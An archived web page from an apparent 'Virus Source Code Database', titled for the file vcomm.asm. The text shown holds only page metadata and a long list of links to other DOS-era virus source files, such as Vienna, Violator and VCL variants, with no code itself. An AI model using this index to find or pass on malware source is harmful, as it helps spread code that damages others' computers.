<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: vcomm_asm</title>
<meta name="KEYWORDS" content="vcomm.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for vcomm.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="v13_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v13_asm.php">v13_asm</a><br>
<a href="v1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v1_asm.php">v1_asm</a><br>
<a href="v2100__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v2100__asm.php">v2100__asm</a><br>
<a href="v2p11260_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v2p11260_asm.php">v2p11260_asm</a><br>
<a href="v2p1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v2p1_asm.php">v2p1_asm</a><br>
<a href="v2p6___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v2p6___asm.php">v2p6___asm</a><br>
<a href="v2p6__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v2p6__asm.php">v2p6__asm</a><br>
<a href="v2p6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v2p6_asm.php">v2p6_asm</a><br>
<a href="v2p_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v2p_asm.php">v2p_asm</a><br>
<a href="v_345_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_345_asm.php">v_345_asm</a><br>
<a href="v-345__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v-345__asm.php">v-345__asm</a><br>
<a href="v-345_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v-345_asm.php">v-345_asm</a><br>
<a href="v376_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v376_asm.php">v376_asm</a><br>
<a href="v44_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v44_asm.php">v44_asm</a><br>
<a href="v512-1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v512-1_asm.php">v512-1_asm</a><br>
<a href="v512_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v512_asm.php">v512_asm</a><br>
<a href="v_582_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_582_asm.php">v_582_asm</a><br>
<a href="v-582_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v-582_asm.php">v-582_asm</a><br>
<a href="v_621_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_621_asm.php">v_621_asm</a><br>
<a href="v-621_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v-621_asm.php">v-621_asm</a><br>
<a href="v648_2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v648_2_asm.php">v648_2_asm</a><br>
<a href="v648_3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v648_3_asm.php">v648_3_asm</a><br>
<a href="v648-3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v648-3_asm.php">v648-3_asm</a><br>
<a href="v_648_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_648_asm.php">v_648_asm</a><br>
<a href="v-648_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v-648_asm.php">v-648_asm</a><br>
<a href="v800_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v800_asm.php">v800_asm</a><br>
<a href="v_822_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_822_asm.php">v_822_asm</a><br>
<a href="v_847_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_847_asm.php">v_847_asm</a><br>
<a href="v-847_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v-847_asm.php">v-847_asm</a><br>
<a href="vacsv_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vacsv_asm.php">vacsv_asm</a><br>
<a href="vac_tp05_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vac_tp05_asm.php">vac_tp05_asm</a><br>
<a href="vac_tp24_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vac_tp24_asm.php">vac_tp24_asm</a><br>
<a href="vamp_10_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vamp_10_asm.php">vamp_10_asm</a><br>
<a href="vamp-heu_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vamp-heu_asm.php">vamp-heu_asm</a><br>
<a href="vampiro_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vampiro_asm.php">vampiro_asm</a><br>
<a href="varicel2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/varicel2_asm.php">varicel2_asm</a><br>
<a href="varicel_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/varicel_asm.php">varicel_asm</a><br>
<a href="varicell_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/varicell_asm.php">varicell_asm</a><br>
<a href="v_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_asm.php">v_asm</a><br>
<a href="v_bnb_pe_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_bnb_pe_asm.php">v_bnb_pe_asm</a><br>
<a href="v-bnb-pe_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v-bnb-pe_asm.php">v-bnb-pe_asm</a><br>
<a href="vboot_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vboot_asm.php">vboot_asm</a><br>
<a href="v_bush_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_bush_asm.php">v_bush_asm</a><br>
<a href="v-bush_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v-bush_asm.php">v-bush_asm</a><br>
<a href="v_cancer_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_cancer_asm.php">v_cancer_asm</a><br>
<a href="v-cancer_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v-cancer_asm.php">v-cancer_asm</a><br>
<a href="v_choink_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_choink_asm.php">v_choink_asm</a><br>
<a href="v-choink_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v-choink_asm.php">v-choink_asm</a><br>
<a href="vcl1casc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl1casc_asm.php">vcl1casc_asm</a><br>
<a href="vcl2casc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl2casc_asm.php">vcl2casc_asm</a><br>
<a href="vcl_674_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl_674_asm.php">vcl_674_asm</a><br>
<a href="vcl-674_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl-674_asm.php">vcl-674_asm</a><br>
<a href="vcl_b52_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl_b52_asm.php">vcl_b52_asm</a><br>
<a href="vcl-b52_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl-b52_asm.php">vcl-b52_asm</a><br>
<a href="vcl_badc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl_badc_asm.php">vcl_badc_asm</a><br>
<a href="vcl-badc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl-badc_asm.php">vcl-badc_asm</a><br>
<a href="vclbadco_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vclbadco_asm.php">vclbadco_asm</a><br>
<a href="vclcodez_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vclcodez_asm.php">vclcodez_asm</a><br>
<a href="vcl_denz_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl_denz_asm.php">vcl_denz_asm</a><br>
<a href="vcl-denz_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl-denz_asm.php">vcl-denz_asm</a><br>
<a href="vcl_dia6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl_dia6_asm.php">vcl_dia6_asm</a><br>
<a href="vcl-dia6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl-dia6_asm.php">vcl-dia6_asm</a><br>
<a href="vcl_dial_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl_dial_asm.php">vcl_dial_asm</a><br>
<a href="vcl-dial_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl-dial_asm.php">vcl-dial_asm</a><br>
<a href="vcl_diar_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl_diar_asm.php">vcl_diar_asm</a><br>
<a href="vcl-diar_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl-diar_asm.php">vcl-diar_asm</a><br>
<a href="vcl_dont_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl_dont_asm.php">vcl_dont_asm</a><br>
<a href="vcl-dont_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl-dont_asm.php">vcl-dont_asm</a><br>
<a href="vclearth_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vclearth_asm.php">vclearth_asm</a><br>
<a href="vclgen12_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vclgen12_asm.php">vclgen12_asm</a><br>
<a href="vcl_gif_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl_gif_asm.php">vcl_gif_asm</a><br>
<a href="vcl-gif_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl-gif_asm.php">vcl-gif_asm</a><br>
<a href="vclgoob2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vclgoob2_asm.php">vclgoob2_asm</a><br>
<a href="vclgoobr_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vclgoobr_asm.php">vclgoobr_asm</a><br>
<a href="vclheeva_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vclheeva_asm.php">vclheeva_asm</a><br>
<a href="vcl_john_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl_john_asm.php">vcl_john_asm</a><br>
<a href="vcl-john_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl-john_asm.php">vcl-john_asm</a><br>
<a href="vcl_kinn_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl_kinn_asm.php">vcl_kinn_asm</a><br>
<a href="vcl-kinn_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl-kinn_asm.php">vcl-kinn_asm</a><br>
<a href="vclmcyel_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vclmcyel_asm.php">vclmcyel_asm</a><br>
<a href="vclmikes_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vclmikes_asm.php">vclmikes_asm</a><br>
<a href="vclnomem_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vclnomem_asm.php">vclnomem_asm</a><br>
<a href="vclolymp_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vclolymp_asm.php">vclolymp_asm</a><br>
<a href="vclpearl_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vclpearl_asm.php">vclpearl_asm</a><br>
<a href="vclquake_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vclquake_asm.php">vclquake_asm</a><br>
<a href="vcl_ramm_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl_ramm_asm.php">vcl_ramm_asm</a><br>
<a href="vcl-ramm_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl-ramm_asm.php">vcl-ramm_asm</a><br>
<a href="vcl_rich_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl_rich_asm.php">vcl_rich_asm</a><br>
<a href="vcl-rich_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl-rich_asm.php">vcl-rich_asm</a><br>
<a href="vclroach_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vclroach_asm.php">vclroach_asm</a><br>
<a href="vcl_rtns_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl_rtns_asm.php">vcl_rtns_asm</a><br>
<a href="vclsboot_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vclsboot_asm.php">vclsboot_asm</a><br>
<a href="vclsimpl_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vclsimpl_asm.php">vclsimpl_asm</a><br>
<a href="vclstyxb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vclstyxb_asm.php">vclstyxb_asm</a><br>
<a href="vcltaboo_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcltaboo_asm.php">vcltaboo_asm</a><br>
<a href="vcl_test_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl_test_asm.php">vcl_test_asm</a><br>
<a href="vclvmess_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vclvmess_asm.php">vclvmess_asm</a><br>
<a href="vclyank2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vclyank2_asm.php">vclyank2_asm</a><br>
<a href="vcm_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcm_asm.php">vcm_asm</a><br>
<a href="vcomm_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcomm_asm.php">vcomm_asm</a><br>
<a href="v_dos625_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_dos625_asm.php">v_dos625_asm</a><br>
<a href="v_dq1028_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_dq1028_asm.php">v_dq1028_asm</a><br>
<a href="v-dq1028_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v-dq1028_asm.php">v-dq1028_asm</a><br>
<a href="vector_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vector_asm.php">vector_asm</a><br>
<a href="vengence_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vengence_asm.php">vengence_asm</a><br>
<a href="vfsi_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vfsi_asm.php">vfsi_asm</a><br>
<a href="vfsi_asm_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vfsi_asm_asm.php">vfsi_asm_asm</a><br>
<a href="vfsi-asm_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vfsi-asm_asm.php">vfsi-asm_asm</a><br>
<a href="vg-tbsi__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vg-tbsi__asm.php">vg-tbsi__asm</a><br>
<a href="vg_tbsig_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vg_tbsig_asm.php">vg_tbsig_asm</a><br>
<a href="vg-tbsig_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vg-tbsig_asm.php">vg-tbsig_asm</a><br>
<a href="vgtbsig_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vgtbsig_asm.php">vgtbsig_asm</a><br>
<a href="vhp-627_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vhp-627_asm.php">vhp-627_asm</a><br>
<a href="vhp_648_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vhp_648_asm.php">vhp_648_asm</a><br>
<a href="vhp-648_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vhp-648_asm.php">vhp-648_asm</a><br>
<a href="vi2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vi2_asm.php">vi2_asm</a><br>
<a href="vi5_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vi5_asm.php">vi5_asm</a><br>
<a href="vi_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vi_asm.php">vi_asm</a><br>
<a href="victor_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/victor_asm.php">victor_asm</a><br>
<a href="vien547_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vien547_asm.php">vien547_asm</a><br>
<a href="vien582_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vien582_asm.php">vien582_asm</a><br>
<a href="vien648_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vien648_asm.php">vien648_asm</a><br>
<a href="vien822_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vien822_asm.php">vien822_asm</a><br>
<a href="vien_a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vien_a_asm.php">vien_a_asm</a><br>
<a href="viena____asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/viena____asm.php">viena____asm</a><br>
<a href="vien_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vien_asm.php">vien_asm</a><br>
<a href="vienna0_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vienna0_asm.php">vienna0_asm</a><br>
<a href="vienna2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vienna2_asm.php">vienna2_asm</a><br>
<a href="vienna3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vienna3_asm.php">vienna3_asm</a><br>
<a href="vienna4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vienna4_asm.php">vienna4_asm</a><br>
<a href="vienna___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vienna___asm.php">vienna___asm</a><br>
<a href="vienna__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vienna__asm.php">vienna__asm</a><br>
<a href="vienna_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vienna_asm.php">vienna_asm</a><br>
<a href="viol-1a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/viol-1a_asm.php">viol-1a_asm</a><br>
<a href="viola_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/viola_asm.php">viola_asm</a><br>
<a href="violator_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/violator_asm.php">violator_asm</a><br>
<a href="viol-b2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/viol-b2_asm.php">viol-b2_asm</a><br>
<a href="violb2__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/violb2__asm.php">violb2__asm</a><br>
<a href="violb2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/violb2_asm.php">violb2_asm</a><br>
<a href="viol-b3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/viol-b3_asm.php">viol-b3_asm</a><br>
<a href="violb3__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/violb3__asm.php">violb3__asm</a><br>
<a href="violb3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/violb3_asm.php">violb3_asm</a><br>
<a href="viol-b4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/viol-b4_asm.php">viol-b4_asm</a><br>
<a href="viol-b5_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/viol-b5_asm.php">viol-b5_asm</a><br>
<a href="viol-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/viol-b_asm.php">viol-b_asm</a><br>
<a href="violb__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/violb__asm.php">violb__asm</a><br>
<a href="violb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/violb_asm.php">violb_asm</a><br>
<a href="viol-c_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/viol-c_asm.php">viol-c_asm</a><br>
<a href="vip-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vip-b_asm.php">vip-b_asm</a><br>
<a href="viper_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/viper_asm.php">viper_asm</a><br>
<a href="viper-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/viper-b_asm.php">viper-b_asm</a><br>
<a href="viperizb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/viperizb_asm.php">viperizb_asm</a><br>
<a href="vir1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vir1_asm.php">vir1_asm</a><br>
<a href="vir1_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vir1_pas.php">vir1_pas</a><br>
<a href="vir2_2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vir2_2_asm.php">vir2_2_asm</a><br>
<a href="vir2a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vir2a_asm.php">vir2a_asm</a><br>
<a href="vir2__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vir2__asm.php">vir2__asm</a><br>
<a href="vir2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vir2_asm.php">vir2_asm</a><br>
<a href="vir2_av_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vir2_av_asm.php">vir2_av_asm</a><br>
<a href="vir3_bas.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vir3_bas.php">vir3_bas</a><br>
<a href="vir5_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vir5_asm.php">vir5_asm</a><br>
<a href="vir6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vir6_asm.php">vir6_asm</a><br>
<a href="vir__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vir__asm.php">vir__asm</a><br>
<a href="vir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vir_asm.php">vir_asm</a><br>
<a href="virdem_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/virdem_asm.php">virdem_asm</a><br>
<a href="virnew_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/virnew_asm.php">virnew_asm</a><br>
<a href="viroprot_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/viroprot_asm.php">viroprot_asm</a><br>
<a href="vir_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vir_pas.php">vir_pas</a><br>
<a href="virus1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/virus1_asm.php">virus1_asm</a><br>
<a href="virus2___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/virus2___asm.php">virus2___asm</a><br>
<a href="virus2__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/virus2__asm.php">virus2__asm</a><br>
<a href="virus2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/virus2_asm.php">virus2_asm</a><br>
<a href="virus2_bas.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/virus2_bas.php">virus2_bas</a><br>
<a href="virus2_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/virus2_pas.php">virus2_pas</a><br>
<a href="virus3___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/virus3___asm.php">virus3___asm</a><br>
<a href="virus3__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/virus3__asm.php">virus3__asm</a><br>
<a href="virus3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/virus3_asm.php">virus3_asm</a><br>
<a href="virus6_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/virus6_pas.php">virus6_pas</a><br>
<a href="virusa_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/virusa_asm.php">virusa_asm</a><br>
<a href="virus____asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/virus____asm.php">virus____asm</a><br>
<a href="virus_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/virus_asm.php">virus_asm</a><br>
<a href="vlad_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vlad_asm.php">vlad_asm</a><br>
<a href="vlad-dir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vlad-dir_asm.php">vlad-dir_asm</a><br>
<a href="v_les1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_les1_asm.php">v_les1_asm</a><br>
<a href="v_les2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_les2_asm.php">v_les2_asm</a><br>
<a href="vmessiah_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vmessiah_asm.php">vmessiah_asm</a><br>
<a href="vn_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vn_asm.php">vn_asm</a><br>
<a href="vootie_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vootie_asm.php">vootie_asm</a><br>
<a href="vor_1600_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vor_1600_asm.php">vor_1600_asm</a><br>
<a href="vor_370_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vor_370_asm.php">vor_370_asm</a><br>
<a href="vote_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vote_asm.php">vote_asm</a><br>
<a href="v_para2b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_para2b_asm.php">v_para2b_asm</a><br>
<a href="v-para2b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v-para2b_asm.php">v-para2b_asm</a><br>
<a href="vrl0_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vrl0_asm.php">vrl0_asm</a><br>
<a href="vrl1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vrl1_asm.php">vrl1_asm</a><br>
<a href="vrl2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vrl2_asm.php">vrl2_asm</a><br>
<a href="vrl_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vrl_asm.php">vrl_asm</a><br>
<a href="vs_108_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vs_108_asm.php">vs_108_asm</a><br>
<a href="vs_122_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vs_122_asm.php">vs_122_asm</a><br>
<a href="vscie_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vscie_asm.php">vscie_asm</a><br>
<a href="vslay_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vslay_asm.php">vslay_asm</a><br>
<a href="v_ston90_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_ston90_asm.php">v_ston90_asm</a><br>
<a href="v-ston90_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v-ston90_asm.php">v-ston90_asm</a><br>
<a href="v_vhp348_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_vhp348_asm.php">v_vhp348_asm</a><br>
<a href="v-vhp348_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v-vhp348_asm.php">v-vhp348_asm</a><br>
<a href="v_vhp353_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_vhp353_asm.php">v_vhp353_asm</a><br>
<a href="v-vhp353_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v-vhp353_asm.php">v-vhp353_asm</a><br>
<a href="v_vhp367_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_vhp367_asm.php">v_vhp367_asm</a><br>
<a href="v-vhp367_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v-vhp367_asm.php">v-vhp367_asm</a><br>
<a href="v_vhp435_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_vhp435_asm.php">v_vhp435_asm</a><br>
<a href="v-vhp435_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v-vhp435_asm.php">v-vhp435_asm</a><br>
<a href="v_vhp623_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_vhp623_asm.php">v_vhp623_asm</a><br>
<a href="v-vhp623_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v-vhp623_asm.php">v-vhp623_asm</a><br>
<a href="v_viola_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_viola_asm.php">v_viola_asm</a><br>
<a href="v-viola_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v-viola_asm.php">v-viola_asm</a><br>
<a href="v_violb1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_violb1_asm.php">v_violb1_asm</a><br>
<a href="v-violb1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v-violb1_asm.php">v-violb1_asm</a><br>
<a href="v_violb2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_violb2_asm.php">v_violb2_asm</a><br>
<a href="v-violb2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v-violb2_asm.php">v-violb2_asm</a><br>
<a href="v_violb3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_violb3_asm.php">v_violb3_asm</a><br>
<a href="v-violb3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v-violb3_asm.php">v-violb3_asm</a><br>
<a href="v_violb4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_violb4_asm.php">v_violb4_asm</a><br>
<a href="v-violb4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v-violb4_asm.php">v-violb4_asm</a><br>
<a href="v_violc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_violc_asm.php">v_violc_asm</a><br>
<a href="v-violc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v-violc_asm.php">v-violc_asm</a><br>
<a href="v_viperb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_viperb_asm.php">v_viperb_asm</a><br>
<a href="v-viperb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v-viperb_asm.php">v-viperb_asm</a><br>
